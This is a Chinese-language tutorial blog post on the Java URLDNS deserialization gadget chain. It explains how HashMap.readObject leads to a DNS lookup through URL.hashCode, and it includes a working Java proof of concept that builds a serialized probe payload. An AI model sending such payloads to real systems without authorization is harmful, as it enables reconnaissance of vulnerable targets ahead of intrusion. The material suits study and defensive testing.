---
title: Java 反序列化：URLDNS 链
date: 2026-11-22 08:08:00
author: Xendr1a
categories: [Web安全, Web基础]
tags: [Java, 反序列化, URLDNS]
description: URLDNS 链的原理、HashMap 反序列化触发点与验证方法。
toc: true
---

URLDNS 不执行命令，只验证「目标是否存在 Java 反序列化」。这篇从 HashMap.readObject 讲到 URL.hashCode 触发 DNS 解析。

## URLDNS链

### URLDNS链

URLDNS链它主要用于**探测和验证**目标系统是否存在Java反序列化漏洞，而不是用于执行任意命令。

### 原理

利用 Java 的 HashMap 在反序列化（readObject）还原数据时，会为了构建哈希表而自动计算 Key 的 Hash 值，而 java.net.URL 这个类的 hashCode() 方法在计算时，会触发 DNS 解析。

**HashMap 的机制**：

反序列化时，HashMap 需要还原数据。为了将 Key 放到哈希表正确的桶（Bucket）中，它必须重新计算 Key 的 Hash 值。

```text
private void readObject(ObjectInputStream s)
        throws IOException, ClassNotFoundException {

        ObjectInputStream.GetField fields = s.readFields();

        // Read loadFactor (ignore threshold)
        float lf = fields.get("loadFactor", 0.75f);
        if (lf <= 0 || Float.isNaN(lf))
            throw new InvalidObjectException("Illegal load factor: " + lf);

        lf = Math.clamp(lf, 0.25f, 4.0f);
        HashMap.UnsafeHolder.putLoadFactor(this, lf);

        reinitialize();

        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0) {
            throw new InvalidObjectException("Illegal mappings count: " + mappings);
        } else if (mappings == 0) {
            // use defaults
        } else if (mappings > 0) {
            double dc = Math.ceil(mappings / (double)lf);
            int cap = ((dc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (dc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)dc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                //调用hash(key)计算哈希值
                //该方法内部会调用key.hashCode()
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

这个过程在 readObject() 方法中触发，最终调用了 hash(key)。

**URL 的特殊性**：

当 Key 是 java.net.URL 对象时，HashMap 会调用 URL.hashCode()。

Java 官方为了判断两个 URL 是否相等（例如 http://example.com 和 http://93.184.216.34），默认策略是去解析域名获取 IP。如果 IP 相同，哈希值就相同。这里有一个关键的缓存机制：

```text
    public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;
        //hashCode字段默认是为-1，如果不为-1，说明已经计算过，直接返回缓存值（不会触发DNS）。
        hashCode = handler.hashCode(this);
        //如果为-1，则调用handler计算哈希
        return hashCode;
    }
```

URL 类将具体的计算委托给了 URLStreamHandler。为了计算准确的哈希值，程序必须获取域名的 IP 地址。

```text
protected int hashCode(URL u) {
        int h = 0;

        // Generate the protocol part.
        String protocol = u.getProtocol();
        if (protocol != null)
            h += protocol.hashCode();

        // Generate the host part.
        InetAddress addr = getHostAddress(u);
        //getHostAddress方法会尝试解析URL中的域名获取IP，只要走到了这就会发出DNS请求

        // ...
        return h;
    }
```

### 利用链

```text
1. HashMap.readObject()              //反序列化入口
2. HashMap.hash()                    //为了还原Map，需要计算Key的哈希
3. URL.hashCode()                    //Key是URL对象，调用其hashCode
4. URLStreamHandler.hashCode()       //URL委托Handler计算
5. URLStreamHandler.getHostAddress() //解析域名IP
```

### POC 构造与复现

在构造 Payload 时，我们面临一个问题：

如果直接执行 map.put(url, "val")，本地解析后会将 URL 对象的 hashCode 缓存（不再是 -1）。

我们可以用反射来修改对象属性的值

```text
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS{
    public static void main(String[] args) throws Exception{
        String dns = "https://www.baidu.com";//可以去dnslog.cn生成一个测试
        URL url = new URL(dns);
        HashMap<URL, String> map = new HashMap<>();

        //获取URL类的hashCode字段（私有），开放访问权限
        Field f = URL.class.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, 123);          //防止本地map.put()时触发DNS查询，同时防止hashCode被缓存
        map.put(url, "x");
        f.set(url, -1);           
        //确保payload发送到目标后，目标反序列化时发现是-1，从而重新计算hash触发DNS

        //序列化
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("poc.bin"))){
            oos.writeObject(map);
        }

        //反序列化（触发点）
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream("poc.bin"))){
            ois.readObject(); //这会发起DNS查询
        }
        System.out.println("Done.");
    }
}
```
